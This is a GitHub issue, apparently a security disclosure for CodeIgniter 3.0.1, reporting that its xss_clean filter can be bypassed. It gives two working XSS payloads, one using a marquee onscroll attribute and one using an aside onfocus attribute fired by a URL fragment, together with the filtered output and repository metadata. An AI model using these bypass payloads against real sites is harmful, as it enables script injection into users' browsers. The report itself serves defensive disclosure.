I'm using CodeIgniter 3.0.1. \n\nHere's an example:\n\n```\n<?=xss_clean('<marquee x=\"\n>\"onscroll=alert(1)>')?>\n```\n\nThis will result in the following output:\n\n```\n<marquee x=\"\n>\"onscroll=alert&#40;1&#41;>\n```\n\nThis one will work in Webkit/Firefox, since Blink(Chrome) uses it's own marquee-handler which has deprecated the `onscroll` attribute. However, by using another method you can also trigger it without interaction in Webkit/Blink:\n\n```\n<?=xss_clean('<aside tabindex=0 id=x x=\"\n>\"onfocus=alert(1)>')?>\n```\n\nThis will result in the following output:\n\n```\n<aside tabindex=0 id=x x=\"\n>\"onfocus=alert&#40;1&#41;>\n```\n\n(By visiting the URL with this payload, appending #x to the URL-fragment, the element will focus automatically and trigger the onfocus-event, ie: example.html#x )\n\nRegards,\nFrans Rosén\nwww.detectify.com\n","closed_by":{"login":"narfbg","id":1058011,"node_id":"MDQ6VXNlcjEwNTgwMTE=","avatar_url":"https://avatars.githubusercontent.com/u/1058011?v=4","gravatar_id":"","url":"https://api.github.com/users/narfbg","html_url":"https://github.com/narfbg","followers_url":"https://api.github.com/users/narfbg/followers","following_url":"https://api.github.com/users/narfbg/following{/other_user}","gists_url":"https://api.github.com/users/narfbg/gists{/gist_id}","starred_url":"https://api.github.com/users/narfbg/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/narfbg/subscriptions","organizations_url":"https://api.github.com/users/narfbg/orgs","repos_url":"https://api.github.com/users/narfbg/repos","events_url":"https://api.github.com/users/narfbg/events{/privacy}","received_events_url":"https://api.github.com/users/narfbg/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106/timeline","performed_via_github_app":null,"state_reason":"completed"}
